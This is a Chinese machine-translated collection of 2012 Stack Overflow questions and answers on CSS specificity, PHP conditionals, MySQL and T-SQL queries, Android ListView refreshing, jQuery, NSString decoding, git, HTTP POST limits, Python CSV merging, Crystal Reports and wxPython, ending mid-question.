在这个 jsfiddle 中：http: [//jsfiddle.net/Ekbsb/1/](http://jsfiddle.net/Ekbsb/1/) 为什么外部 div 的 UL CSS 优先于“下游”div 的 UL 规则？

再具体一点：

```
#bodytopPan ul{margin:0px 0px 0px 25px; padding:0px;} 
```

正在覆盖此代码：

```
.ILdropdown  ul{
    left: 0;
    margin: 5px 0;
} 
```

即使`.ILdropdown ul`在 HTML 中被置于“较低”位置。这不是与它应该如何工作相反吗？

我的目标是`body ul`用这个特定实例的代码替换代码。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T21:28:55.183

CSS id (#) 优先于类 (.)

重写如下：

```
#bodytopPan ul{margin:0px 0px 0px 25px; padding:0px;}

#bodytopPan .ILdropdown  ul{
    left: 0;
    margin: 5px 0;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T21:29:01.330

# bodytopPan 是一个 id，它比 .ILdropdown 更具体，它是一个类。特异性越高，越强调声明。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T21:27:59.053

这与 HTML 中的顺序无关，而与 CSS 中的顺序有关。

编辑：如果你想具体一点（即只影响“body”中的主要、第一个 ul 而没有其他，你可以这样做`body > ul`只会针对无序列表，其中的无序列表是 body 的直接子级。显然你可能不会有这种情况，更像是，`body > div > div > ul`但它可以让您更具体地确定您想要定位的 UL（如果它没有类）

# php - 在 PHP 中，elseif 是否需要最后的 else 语句？

> ID：11786043
> 
> 赞同：12
> 
> 时间：2012-08-02T21:26:24.080
> 
> 标签：php, if-statement

是否可以在 PHP 的 elseif 块中省略最后的 else 语句。这段代码可以吗

```
if ( condition ):
   // code
elseif ( othercondition ):
   // more code
endif; 
```

还是最后应该有别的？

```
if ( condition ):
   // code
elseif ( othercondition ):
   // more code
else
   // more code
endif; 
```

我确定它一定是，但我无法在任何地方得到确认。编辑 - 我已经尝试过了，它可以工作，但我只是想确定一下。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-02T21:27:52.973

如果您不需要最终`else`块，请不要编写。拥有一个不需要的代码块（可能只包含一个`this is useless`注释）是没有意义的。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-02T21:59:27.290

虽然@oezi 的回答是 100% 正确的，但我还要补充一点，就*最佳实践*而言，该`else`条件*应*在所有情况下都使用。但这并不意味着您必须`else`从字面上使用块，因为您可以通过将“其他代码”放在`if`. 例如：

```
$foo = 'baz';

if (...) {
    $foo = 'foo';
} else if (...) {
    $foo = 'bar';
} 
```

...在功能上等同于：

```
if (...) {
    $foo = 'foo';
} else if (...) {
    $foo = 'bar';
} else {
    $foo = 'baz';
} 
```

我认为`else`在阅读代码时使用更清楚，但任何一种方式都可以。请记住，完全忽略第三种情况是导致错误的常见原因（在某些情况下，甚至是安全漏洞）。

# mysql - MySQL：查询具有特定列值的记录组

> ID：11786049
> 
> 赞同：0
> 
> 时间：2012-08-02T21:27:23.287
> 
> 标签：mysql

我有以下记录：

```
name                            acct_num    address     city        rep     primary
DARTMOUTH HITCHCOCK HOSPITAL    1212 MEDICAL CENTER DR  LEBANON P   Meehan    Y
DARTMOUTH HITCHCOCK HOSPITAL    1212 MEDICAL CENTER DR  LEBANON P   Johnson   N

MASSACHUSETTS GENERAL HOSPITAL  891 PO BOX 123  CHARLESTOWN P   Morrison  N
MASSACHUSETTS GENERAL HOSPITAL  891 PO BOX 123  CHARLESTOWN P   McCoy     N
MASSACHUSETTS GENERAL HOSPITAL  891 PO BOX 123  CHARLESTOWN P   Lorena    N

CLINIC PHARMACY CONTROL SUPPLY  282043  1 MEDICAL CENTER DR LEBANON P Sikes   N
CLINIC PHARMACY CONTROL SUPPLY  282043  1 MEDICAL CENTER DR LEBANON P Kang    Y
CLINIC PHARMACY CONTROL SUPPLY  282043  1 MEDICAL CENTER DR LEBANON P Tolbert N 
```

基本上我需要查询任何没有主要联系人的医院（所有主要='N'）。因此，在上述记录中，我需要获得 MASSACHUSETTS GENERAL HOSPITAL，因为所有记录都是 primary='N'。

我试过：

```
SELECT * FROM `account_prof_affiliation_view` where primary_sf='N' GROUP BY accnt_num 
```

但这只会捕获甚至只有一个主='N'的所有记录。执行此操作的正确 SQL 查询是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:34:07.810

一种方法是：

```
SELECT name, accnt_num
FROM account_prof_affiliation_view
GROUP BY accnt_num, name
HAVING MAX(primary) = 'N' 
```

这利用了`'Y'`排序后的事实`'N'`，因此只要该组`MAX(primary)`中`'Y'`有一个`'Y'`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T21:34:24.083

当您制作 时`GROUP BY`，它必须至少包含您选择的所有数据。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T21:42:46.053

如果您不想像[我的其他答案](https://stackoverflow.com/a/11786126/1468366)那样依赖排序规则，那么您可以使用它：

```
SELECT accts.account_num
FROM (SELECT DISTINCT account_num FROM account_prof_affiliation_view) accts
     LEFT JOIN account_prof_affiliation_view aff
            ON (aff.primary_sf = 'Y' AND aff.account_num = accts.account_num)
WHERE aff.account_num IS NULL 
```

请注意，您的数据库模式似乎违反了[第二范式](http://en.wikipedia.org/wiki/Second_normal_form)：姓名、地址和城市很可能可以从 account_num 中推导出来，因此最好为该信息提供一个单独的表。如果这是因为数据来自视图，如名称所示，而不是来自实际表，那​​么这没关系，但您仍然可以通过使用上面子查询中的基础表而不是整个表来提高效率看法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T21:34:44.750

```
select * from account_prof_affiliation_view a
where not exists (
  select `primary` from account_prof_affiliation_view b
  where b.id=a.id
  and   b.primary = 'Y'
) 
```

# android - 从 ArrayAdapter 刷新 ListView

> ID：11786050
> 
> 赞同：6
> 
> 时间：2012-08-02T21:27:23.533
> 
> 标签：android, android-listview, android-arrayadapter

我`ArrayAdapter`用来将我的数据从 my 绑定`ArrayList`到 my `ListView`，我使用 an`AlertDialog`将数据插入到我的 `Arraylist`. `ListView`我的问题是更改完成后我无法刷新。

**代码**

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.config_hidden);
    listView=(ListView) findViewById(R.id.hiddenList);
    xmlFileManager=new XmlFileManager(this);
    addNumber=(Button) findViewById(R.id.addNum);

    addNumber.setOnClickListener(new OnClickListener() {

        public void onClick(View arg0) {

            LayoutInflater factory = LayoutInflater.from(HiddenCall.this);
            final View alertDialogView = factory.inflate(R.layout.add_number, null);
            AlertDialog.Builder adb = new AlertDialog.Builder(HiddenCall.this);
            adb.setView(alertDialogView);
            adb.setTitle(R.string.dialog_title);
            adb.setIcon(R.drawable.phone);

            final AlertDialog alertDialog = adb.create();

            adb.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    numberToAdd=(EditText) alertDialogView.findViewById(R.id.numberToAdd);
                    String number = numberToAdd.getText().toString();
                    if(number.length()>0){
                        xmlFileManager.addNumberToXml(number , HIDDEN_NUMBER_TYPE);
                        adapter = new ArrayAdapter<String>(getApplicationContext(), android.R.layout.simple_list_item_1, xmlFileManager.getHiddenNumbers());
                        adapter.setNotifyOnChange(true);
                        adapter.notifyDataSetChanged();
                    }
                } });

            adb.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    alertDialog.dismiss();
                } });
            adb.show();
        }
    });
    adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, xmlFileManager.getHiddenNumbers());
    adapter.notifyDataSetChanged();
    adapter.setNotifyOnChange(true);
    listView.setAdapter(adapter);
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T21:33:55.220

您每次都在实例化一个新适配器。您需要做的是将实例化适配器的行放在单击侦听器之前，然后在单击侦听器中修改该适配器并在其上调用 notifyDataSetChanged()。您当然必须向适配器添加一些设置器才能修改数据。

必须看起来类似于：

```
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.config_hidden);
listView=(ListView) findViewById(R.id.hiddenList);

//instantiate the adapter (just one time)
adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, xmlFileManager.getHiddenNumbers());

//assign the adapter to the listview
listView.setAdapter(adapter);

xmlFileManager=new XmlFileManager(this);
addNumber=(Button) findViewById(R.id.addNum);

addNumber.setOnClickListener(new OnClickListener() {

    public void onClick(View arg0) {

        LayoutInflater factory = LayoutInflater.from(HiddenCall.this);
        final View alertDialogView = factory.inflate(R.layout.add_number, null);
        AlertDialog.Builder adb = new AlertDialog.Builder(HiddenCall.this);
        adb.setView(alertDialogView);
        adb.setTitle(R.string.dialog_title);
        adb.setIcon(R.drawable.phone);

        final AlertDialog alertDialog = adb.create();

        adb.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                numberToAdd=(EditText) alertDialogView.findViewById(R.id.numberToAdd);
                String number = numberToAdd.getText().toString();
                if(number.length()>0){
                    xmlFileManager.addNumberToXml(number , HIDDEN_NUMBER_TYPE);
                    //adapter = new ArrayAdapter<String>(getApplicationContext(), android.R.layout.simple_list_item_1, xmlFileManager.getHiddenNumbers());
                    //adapter.setNotifyOnChange(true);

                    //set the changed data
                    adapter.setData(xmlFileManager.getHiddenNumbers());

                    //notify that the model changed
                    adapter.notifyDataSetChanged();
                }
            } });

        adb.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                alertDialog.dismiss();
            } });
        adb.show();
    }
});

//adapter.notifyDataSetChanged();
//adapter.setNotifyOnChange(true); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-03-04T09:32:00.010

如果您有一个小的 ArrayList，要在 ArrayList 更改时强制更新 ListView，您可以使用以下代码片段：

```
ArrayAdapter.clear();
ArrayAdapter.addAll(ArrayList);
ArrayAdapter.notifyDataSetChanged(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T21:32:36.410

每次单击都会创建新的适配器。你不需要这样做。您可以修改现有适配器数据并调用 notifyDataSetChanged()。在您的情况下，您应该在 onClick 方法中调用 listView.setAdapter(adapter) 。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T22:01:05.063

在你`adb.setPositiveButton()`的 's`onClick()`中，你不应该创建一个新的适配器。删除这一行：

```
adapter = new ArrayAdapter<String>(getApplicationContext(), android.R.layout.simple_list_item_1, xmlFileManager.getHiddenNumbers()); 
```

只需这样做：

```
if(number.length()>0){
    xmlFileManager.addNumberToXml(number , HIDDEN_NUMBER_TYPE);
    adapter.notifyDataSetChanged();
} 
```

# sql - 如果传递null，TSQL函数会引发错误？

> ID：11786054
> 
> 赞同：1
> 
> 时间：2012-08-02T21:27:30.677
> 
> 标签：sql, sql-server, database, tsql

我希望在我的 TSQL 库中添加一些代码，以防止在列中的数据为空时在 SQL 中执行聚合。理想情况下，如果任何值为空，在 sql server 中会有一个 SUM_NN（对于 sum no null），它会引发错误。

由于您无法从 UDF 引发错误，因此我能想到的唯一方法看起来像这样，尽管我不喜欢这种解决方案：

```
CREATE FUNCTION dbo.NULL_TEST_F(@arg FLOAT)
RETURNS FLOAT
AS
BEGIN
    IF(@arg IS NULL)
        SELECT 1/0
    RETURN @arg
END 
```

注意：我认为这是一个愚蠢的解决方案，但是当我丢失数据时，我已经被烧毁了太多次。此外，我们使用的是 SQL Server 2005，但我对 2008 和 2012 解决方案持开放态度。此外，我想知道其他数据库如何处理此类问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-09T16:06:22.930

这是我的最终解决方案：

```
CREATE FUNCTION [dbo].[NullTest_F]
(
    @input FLOAT,
    @message VARCHAR(100)
)
RETURNS FLOAT
AS
BEGIN
    DECLARE @test INT
    IF(@input IS NULL)
        SELECT @test = CAST(@message AS INT)
    RETURN @input
END 
```

然后，我可以在运行聚合函数时将其嵌入有用的错误消息中。例子：

```
CREATE TABLE Data (
    Date DATETIME,
    DataPoint FLOAT
)

INSERT INTO Data (Date, DataPoint) VALUES ('2012-03-01', 4)
INSERT INTO Data (Date, DataPoint) VALUES ('2012-03-02', 6)

SELECT SUM(NullTest_F(DataPoint, 'Missing data at' + CONVERT(VARCHAR(10), Data))
FROM Data 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:03:22.763

也许这个会有所帮助： [https ://stackoverflow.com/a/4681815/1371070](https://stackoverflow.com/a/4681815/1371070)

`@arg`您可以像上面链接的答案中建议的那样创建一个函数，并从您的聚合中调用它，以防万一`null`。

总体而言，它仍然是相同的策略，但我猜这比除以零更好。

# jquery - 使用 JQuery 的交互式美国地图

> ID：11786066
> 
> 赞同：0
> 
> 时间：2012-08-02T21:28:05.637
> 
> 标签：jquery, dictionary, z-index

我有一个带有交互式美国地图的页面。每个状态都是基于数据库设置可互换的图像（它不是一个大图像和/或图像映射）。我还有一个无序列表（项目绝对位于其相应状态之上）设置为可点击元素以更改 div 的内容。div 包含自己的 div 中的所有内容；显示哪个 div 基于具有“活动”类。脚本和标记可以在这里查看：[https ://gist.github.com/3239999](https://gist.github.com/3239999)

由于 png 图像的重叠，图像本身不能可靠地成为可点击元素，但我希望状态在可能的情况下引导链接。

要点中的代码适用于任何地方，但在新英格兰/东海岸地区的小州的 IE 中除外。我可以通过一些 z-index 工作来解决它，但它并非完美无缺。在某些情况下，您仍然必须单击正确的位置（这不是很明显）。

我愿意为 IE 使用不同的脚本，但我似乎无法将其更改为仅使用 li 作为指示器并在 IE 中工作。我试过这个没有成功：

```
<script type="text/javascript">
    $(document).ready(function() {
        switchers = $('#switchers > li');
        states = $('#state_info > div');
        switchers.each(function(idx) {
            $(this).data('state', states.eq(idx));
        }).click(function() {
             switchers.removeClass('active');
             states.removeClass('active');             
             $("#_" + $(this).attr('id')).addClass('active');  
             $("#_" + $(this).attr('id')).data('state').addClass('active');
        });
    });
</script> 
```

我不像我想的那样精通jquery，尤其是解决跨浏览器问题。

任何人都可以帮助我更好地工作吗？

你可以在这里看到最有效的版本：[http ://www.envisiondemo.com/lookout/state-and-federal-i-9-compliance/](http://www.envisiondemo.com/lookout/state-and-federal-i-9-compliance/)

实际站点是实时的，但我正在使用演示服务器进行测试。我已经将 li 的样式设置为在 IE 中具有红色边框，这可以帮助您查看问题区域的位置。似乎最糟糕的是西弗吉尼亚州和弗吉尼亚州。由于他们从一个角度相互拥抱，我无法更改 z-index 来修复它。一个总是会过度重叠另一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T17:36:58.003

除了考虑将其切换到 SVG 之外（我承认这可能有点极端，因为看起来你已经走得很远了，我可以推荐以下内容：

使用单个背景图像，这样您就可以避免绝对定位所有状态的图像。因此，不要使用以下代码：

```
<div id="states">
    <img />
    <img />
</div>

<ul id="switchers">
    <li></li>
    <li></li>
</ul> 
```

你可以：

```
<ul id="states">
    <li></li>
    <li></li>
</ul> 
```

并用 设置地图`background-url`。最后，我实际上会将状态名称添加到`li`元素中，而不是将它们放在图像中。这使您可以在悬停时突出显示。

您的脚本可以改进如下：

[http://jsfiddle.net/radu/4bVcd/](http://jsfiddle.net/radu/4bVcd/)

```
$(document).ready(function() {
    var $switchers = $('#switchers li'),
        $states = $('#state_info div');

    $switchers.click(function() {
        $switchers.removeClass('active');
        $states.removeClass('active');
        $(this).addClass('active');
        $('#_' + this.id).addClass('active');
    });
}); 
```

在您的脚本中`switchers`，并且`states`是隐式全局变量，因为该`var`语句不存在。我为我的 jQuery 对象添加前缀，`$`但这只是个人喜好。

在您的代码中，您通过 jQuery's链接`state_info`到，但我不确定您是否正确使用它，并且每次点击都会引发错误。`switchers``.data()`

至于您对 IE6 的问题，我建议可能将 WV 或 VA 与其他东海岸州一起移出。即使在可以正常工作的浏览器中，也很难将其挑选出来。为了进一步提高可用性，您可以执行我之前提到的操作，并以某种方式在悬停时突出显示状态名称。您可以更改颜色，增加大小，添加阴影.. 无论如何，只要用户清楚正在选择哪个状态。​</p>

# mysql - 从分组用户使用中消除重叠季度

> ID：11786067
> 
> 赞同：0
> 
> 时间：2012-08-02T21:28:05.650
> 
> 标签：mysql, sql

我有一个用户活动表。我有 HWA、活动日期和 groupID。我根据日期范围获得用户活动的季度，即：

日期范围：2011-08-01 - 2012-07-31

```
Q1 - Aug-Oct
Q2 - Nov-Jan
Q3 - Feb-Apr
Q4 - May-Jul 
```

一些 HWA 是其他 HWA 的替代品。在这些情况下，它们具有相同的 groupID 以表明它们是链接的。在这些情况下，我需要取消重叠的季度。澄清一下，如果两个 HWA 在第 2 季度使用并且它们具有相同的 groupID，那么我只需要为其中一个计算第 2 季度（这无关紧要）。下面是我现在使用的查询，得到的输出是：

```
SELECT act.HWA, count(act.HWA), m.Status, m.GroupID
    FROM (
        SELECT 
          a.HWA, a.Date,
          CASE 
            WHEN MONTH(a.Date) BETWEEN 8 AND 10 THEN 'Q1'
            WHEN (MONTH(a.Date) BETWEEN 11 AND 12 OR MONTH(a.Date) = 1) THEN 'Q2'
            WHEN MONTH(a.Date) BETWEEN 2 AND 4 THEN 'Q3'
            WHEN MONTH(a.Date) BETWEEN 5 AND 7 THEN 'Q4'
          END AS quarter,
          CASE
            WHEN MONTH(a.Date) <= 7 THEN YEAR(a.Date) - 1 
            ELSE EXTRACT(YEAR_MONTH from a.Date)
          END AS quarteryear,
          COUNT(*) AS num_activites
        FROM activity a
        WHERE a.InstitutionNumber = '000000000075'  
          AND (a.HWA = '001372EADBC4' 
            OR a.HWA = '180373E241DB' 
            OR a.HWA = '180373E23DE7')
          AND (a.Date between '2011-08-01' and '2012-07-31')
        GROUP BY
          quarter,
          a.HWA
    ) act, machine m
    where act.HWA = m.HWA
    group by act.HWA 
```

这会返回：

```
HWA             quarters      status      groupid

001372EADBC4        3        deleted        59970
180373E23DE7        2         online        59970
180373E241DB        1        deleted        59970 
```

预期结果将是：

HWA 宿舍状态 groupid

```
001372EADBC4        2        deleted        59970
180373E23DE7        2         online        59970
180373E241DB        0        deleted        59970 
```

这是我通过稍微更改上述查询生成的每个 HWA 的季度列表。您可以看到所有三个 HWA 都有第 3 季度的份额，我希望它们中只有一个拥有第 3 季度的份额：

```
001372EADBC4    1   deleted 59970
001372EADBC4    2   deleted 59970
001372EADBC4    3   deleted 59970
180373E23DE7    3   online  59970
180373E241DB    3   deleted 59970
180373E23DE7    4   online  59970 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T05:12:19.030

所以我通过在大多数情况下改变分组来解决这个问题：

```
SELECT act.HWA, count(act.HWA), m.Status, m.GroupID
  FROM (
   SELECT 
      a.HWA, a.Date,
      CASE
        WHEN MONTH(a.Date) BETWEEN 8 AND 10 THEN '1'
        WHEN (MONTH(a.Date) BETWEEN 11 AND 12 OR MONTH(a.Date) = 1) THEN '2'
        WHEN MONTH(a.Date) BETWEEN 2 AND 4 THEN '3'
        WHEN MONTH(a.Date) BETWEEN 5 AND 7 THEN '4'
       END AS quarter,
       CASE
          WHEN MONTH(a.Date) <= 7 THEN YEAR(a.Date) - 1 
          ELSE EXTRACT(YEAR_MONTH from a.Date)
        END AS quarteryear,
        COUNT(*) AS num_activites
      FROM activity a, machine m
      WHERE
        a.InstitutionNumber = '000000000075'
        AND m.InstitutionID = 14
        AND (a.HWA = '001372EADBC4' 
            OR a.HWA = '180373E241DB' 
            OR a.HWA = '180373E23DE7')
        AND a.HWA = m.HWA
        AND (a.Date between '2011-08-01' and '2012-07-31')
        AND a.EngineRequests > 0
        AND a.FilesAnalyzed > 0
      GROUP BY
        quarter,
        m.GroupID
  ) act, machine m
WHERE act.HWA = m.HWA
AND m.InstitutionID = 14
GROUP BY act.HWA 
```

我在 SELECT 动作中添加了以下内容：

AND m.InstitutionID = 14 按 m.GroupID 分组

我从 SELECT 法案中删除了以下内容：

按 a.HWA 分组

# php - jQuery AJAX 响应错误（FF 和 Safari 不工作）

> ID：11786073
> 
> 赞同：1
> 
> 时间：2012-08-02T21:28:18.660
> 
> 标签：php, ajax, jquery

在 Safari 和 Firefox 中，代码的响应部分不起作用（即来自 PHP-->Ajax-->jQuery）。变量肯定使它对 PHP 很好（使用 测试`mail()`），所以它可能代表我的一些小错误！

**jQuery：**

```
$.ajax({
    type: "POST",
    dataType: "json",
    data: postData,
    url: "http://www.kudiclub.com/test/login/?loginsub",
    success: function(data){
        if(data.success==false){
            $("#login .error").html(data.reply).show();
            $("#login-email").val(data.email);
            $("#password").val("");
        }else{
            window.location = data.ref;
        }
    }
}); 
```

**PHP：**

```
$data = array('success' => false, 'reply' => 'Username and password did not match.', 'email' => $email);
print json_encode($data);
return; 
```

希望有人可以提供帮助。谢谢，尼克。

**解决方案**

经过一番折腾，事实证明它没有将完整的 URL 视为相对路径。改变`url`to就可以`'/test/login/?loginsub'`了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:14:10.873

服务器说：Content-Type：text/html。不是 json 文档（application/json）。

```
http://www.kudiclub.com/test/login/?loginsub

GET /test/login/?loginsub HTTP/1.1
Host: www.kudiclub.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=060b8210adfb3c67ff792b9471c7fa1c
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Thu, 02 Aug 2012 22:12:10 GMT
Server: Apache
X-Powered-By: PHP/5.2.17
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Keep-Alive: timeout=2, max=200
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html 
```

# iphone - 来自nsstring的ios UTF8编码

> ID：11786075
> 
> 赞同：11
> 
> 时间：2012-08-02T21:28:34.927
> 
> 标签：iphone, objective-c, ios, xcode, cocoa-touch

我收到一个未正确编码的 nsstring，例如“mystring%201，其中必须是“mystring 1”。如何替换所有可以解释为 UTF8 的字符？我阅读了很多帖子，但不是完整的解决方案。请请注意，nsstring 已经编码错误，我不是在问如何编码 char 序列。谢谢。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-08-02T21:35:56.140

`- (NSString *)stringByReplacingPercentEscapesUsingEncoding:(NSStringEncoding)encoding`是你想要的。基本上像这样使用它：

```
newString = [myString stringByReplacingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-10-15T08:52:34.930

```
[urlString stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T21:32:43.080

检查[格式化字符串对象](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/Strings/Articles/FormatStrings.html)`Strings and Non-ASCII Characters`部分：

```
NSString *s = [NSString stringWithUTF8String:"Long \xe2\x80\x94   dash"]; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-09-04T13:13:31.323

```
lblDate.text=[NSString stringWithCString:[[arrTripDetail valueForKey:Param_vCurrencySymbol] UTF8String] encoding:NSUTF8StringEncoding]; 
```

**你可以将自定义表情符号转换为字符串**

例如：

> 输入：\U20b9
> 
> 输出：￥</p>

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-02T21:42:21.590

您想要百分比编码/解码还是完整的 URL 编码/解码？-(NSString*)stringByReplacingPercentEscapesUsingEncoding: 如果它只是百分比编码就可以工作，但如果那里有完整的 URL 编码（例如，空格可能是 %20 或 +），那么你将需要类似 url 解码的东西three20 库（或在那里搜索，有很多如何做到这一点的示例，例如[URL 解码/编码 NSString](https://stackoverflow.com/questions/6688287/url-decoding-encoding-nsstring)）。

# git - 使用 git 在特定代码部分中查找随时间的变化

> ID：11786088
> 
> 赞同：4
> 
> 时间：2012-08-02T21:29:51.997
> 
> 标签：git

我想看看一段代码（例如一个方法）是如何随时间变化的。我可以`git blame`用来查找每一行的最新更改，然后查看该提交的差异，但我真正想要的是看到代码在多次提交中演变。

基本上我想要的是`git whatchanged`按行号过滤。基本上类似于以下虚构命令：

```
git whatchanged <filename>:<start-range>...<end-range> 
```

理想情况下，这可以直接通过 git 实现，但我一直在考虑编写一个脚本来过滤`git whatchanged`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:54:19.283

你试过使用`git gui blame`吗？该界面可以轻松地后退（通过单击左侧的链接）以查看文件随时间的变化情况。

# http - http中post数据的最大大小

> ID：11786092
> 
> 赞同：11
> 
> 时间：2012-08-02T21:30:21.163
> 
> 标签：http, post, size

可以使用 HTTP POST 发送的数据量是否有任何限制？

我在一些电子邮件中看到附件有 25 MB 或 20 MB 的限制……但我认为它们是由服务器或应用程序强加的……

就纯 HTTP 而言，是否有任何限制....

另外，字段的值大小也有限制吗？

为什么隐藏字段中的大值不是一件好事，或者不是？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-03T04:05:14.290

发布数据限制由文件上传到的服务器上的应用程序设置。[只是为了给你一些具体的想法，这里是关于 php 手册http://www.php.net/manual/en/features.file-upload.common-pitfalls.php](http://www.php.net/manual/en/features.file-upload.common-pitfalls.php)中关于 max_filesize 的讨论。许多网站使用 php 的内置函数，该链接描述了默认情况下如何设置上传功能。当然，每个 Web 平台的默认值都是不同的，例如它们使用的是 ruby​​ on rails 还是基于 python 的。

# python - python加入两个csv文件

> ID：11786094
> 
> 赞同：1
> 
> 时间：2012-08-02T21:30:26.857
> 
> 标签：python, csv

我有两个 .csv 文件，`headers.csv`和`corrected.csv`. `headers.csv`具有所有标题，而只是`corrected.csv`一堆有组织的数据。

```
headers.csv:           
displacement, load, cputime, ...

corrected.csv:            
-990.478170,-0.000026,15:08:06, ...              
-990.038170,-0.000026,15:08:06, ...

The end goal is to be like this example:      
displacement,load,cputime, ...          
-990.478170,-0.000026,15:08:06, ...              
-990.038170,-0.000026,15:08:06, ... 
```

是）我有的：

```
headers = [x for x in csv.reader(open('headers.csv', 'rb'))]
writer = csv.writer(open('merged.csv', 'wb'))
writer.writerow(headers)
for row in csv.reader(open('corrected.csv', 'rb')):
    writer.writerow(row) 
```

但是，结果`"['displacement', 'load', 'cputime', ...]"`是全部写入 A 列，而我想要 A 列中的位移，B 列中的加载，C 列中的 cputime 等。我也想摆脱，`', ", [], and whitespace`所以最终结果与我的示例完全相同多于。提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T21:35:27.557

假设您有一行以逗号分隔的列名，请尝试：`headers = next(csv.reader(open('headers.csv')))`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T21:37:57.337

使用 python 连接文件似乎有点过头了——

```
cat headers.csv corrected.csv > merged.csv 
```

如果您必须/出于某种原因想要使用 Python，Jon Clements 的想法是正确的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T21:38:19.240

在第一行中，您正在创建一个包含 headers.csv 中所有行的列表（理解列表），这就是您拥有 [] 等的原因。

试试这个（从我的脑海中）：

```
headers = csv.reader(open('headers.csv', 'rb'))[0] 
```

哪个应该只返回第一行。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-03T08:57:37.790

我只是隐藏你有来自 csv 模块的多个文件的事实：

```
import csv

def cat(*files):
    for f in files:
        with open(f) as fobj:
            for line in fobj:
                yield line

writer = csv.writer(open('merged.csv', 'wb'))
for row in csv.reader(cat('headers.csv', 'corrected.csv')):
    writer.writerow(row) 
```

# crystal-reports - 如何在水晶报表中将一行中的多个数据字段显示为列

> ID：11786098
> 
> 赞同：4
> 
> 时间：2012-08-02T21:30:40.493
> 
> 标签：crystal-reports, formula

我正在尝试将数据行显示为 Crystal 报表中的列....以便我从第 1 列中的第 1 行获取数据，从第 2 列中的第 2 行获取数据，等等....？所以要在一列中垂直显示。因此，当您查看列时，您可以看到随着时间的推移情况如何变化。水晶新手需要知道这是否可能。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T06:32:28.100

试试这个

右键单击一个部分，然后转到部分专家，然后检查多列格式，然后设置打印方向

![在此处输入图像描述](../Images/fbb05d2374f70012476e69b58e07b2f7.png)

![在此处输入图像描述](../Images/97d24ec45549ade6bb8d27f25dcf9b64.png)

# python - wxpython 在静态位图上绘图

> ID：11786103
> 
> 赞同：4
> 
> 时间：2012-08-02T21:31:32.583
> 
> 标签：python, wxpython

嘿，当用户单击图表上的某个点时，我正在尝试在图像顶部绘制一个矩形。

为了滚动浏览不同的图表，我使用了 staticBitmap。不幸的是，几乎每次使用 DC 的尝试都失败了。PaintDC 和 BufferedDC 有时会导致发生无限循环，有时会将绘图放在图像后面。ClientDC 显示了我绘制的框，但是当我调整大小时它消失了。当我只将图像保存到文件中时，使用 MemoryDC 创建绘图有效，但未能放置在 staticBitmap 中。

我花了大约一周的时间来解决这个问题，阅读了很多不同的教程和论坛，试图找到同样的问题。我觉得没有其他人有这个问题。

最有效的 ClientDC 必须在调整窗口大小时重新绘制，从而导致闪烁。这是我为 ClientDC 准备的：

```
 self.imageCtrl = wx.StaticBitmap(self.thePanel, wx.ID_ANY, 
                                     wx.EmptyBitmap(517,524))

def OnGoSelect(self,e):
    print "GO"
    img = wx.Image("./poster/"+self.picChoice,wx.BITMAP_TYPE_PNG) 
    self.imageCtrl.SetBitmap(wx.BitmapFromImage(img))

def DrawLine(self):
